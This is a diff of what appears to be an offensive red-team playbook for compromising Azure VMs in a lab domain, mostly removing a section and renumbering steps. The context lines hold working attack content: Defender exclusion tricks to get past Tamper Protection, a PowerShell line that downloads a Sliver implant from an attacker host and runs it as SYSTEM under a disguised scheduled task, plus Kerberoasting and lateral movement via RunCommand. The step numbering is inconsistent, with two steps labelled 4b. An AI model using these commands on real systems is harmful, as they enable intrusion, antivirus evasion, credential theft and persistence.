@@ -220,22 +220,7 @@ Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location
 - Harriet-wrapped implants with DirectSyscalls bypass static detection
 - Avoid known PowerShell reverse shell patterns that trigger `PUA:PowerShell/ReverseShell`
 
-### 4a: Use RunCommand Directly as Your Shell
-
-Since nc reverse shells get flagged, use RunCommand itself for all operations. Each command is a separate RunCommand call:
-
-```powershell
-# Run any command as SYSTEM — Defender doesn't scan RunCommand scripts
-Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" -ScriptString 'whoami; hostname; ipconfig'
-
-# Domain recon
-Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer" `
-  -CommandId "RunPowerShellScript" `
-  -ScriptString 'nltest /dsgetdc:contoso.range; net group "domain admins" /domain; setspn -Q */*'
-```
-
-### 4b: Set Exclusions (Try All — Some May Work Even With Tamper Protection)
+### 4a: Set Exclusions (Try All — Some May Work Even With Tamper Protection)
 
 Tamper Protection blocks broad exclusions but specific path/process exclusions sometimes work. Try each via RunCommand and check which stuck:
 
@@ -269,7 +254,7 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer
 
 Check the output — whatever shows under "Active Exclusions" is what actually took effect.
 
-### 4c: Download + Execute Sliver
+### 4b: Download + Execute Sliver
 
 **Rename the implant to match an excluded process name** (e.g., if `svchost.exe` exclusion worked):
 
@@ -294,9 +279,9 @@ $dl = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\ProgramData\teams.exe 
 $dl = 'iwr http://YOUR_KALI_IP:8080/teams.exe -OutFile C:\Windows\Temp\svc.exe -UseBasicParsing; schtasks /create /tn "\Microsoft\Windows\NetTrace\GatherInfo" /tr "C:\Windows\Temp\svc.exe" /sc once /st 00:00 /ru SYSTEM /f; schtasks /run /tn "\Microsoft\Windows\NetTrace\GatherInfo"'
 ```
 
-If NOTHING bypasses Defender, skip Sliver and use RunCommand as your C2 (Steps 4d-4f work without any implant).
+If NOTHING bypasses Defender, skip Sliver and use RunCommand as your C2 (Steps 4c-4e work without any implant).
 
-### 4c: Kerberoast Directly via RunCommand (No Implant Needed)
+### 4b: Kerberoast Directly via RunCommand (No Implant Needed)
 
 If Sliver can't land, do the full attack chain via RunCommand:
 
@@ -309,7 +294,7 @@ $result = Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blue
 $result.Value[0].Message  # hash output
 ```
 
-### 4d: Lateral Move via RunCommand (No Implant Needed)
+### 4c: Lateral Move via RunCommand (No Implant Needed)
 
 ```powershell
 # WinRM to dbserver via RunCommand on httpserver
@@ -320,7 +305,7 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueHttpServer
 ```
 
 
-### 4e: NC Reverse Shell (Backup — May Get Flagged by Defender)
+### 4d: NC Reverse Shell (Backup — May Get Flagged by Defender)
 
 If Tamper Protection is off or exclusions work in your environment, nc shell gives you an interactive SYSTEM prompt:
 
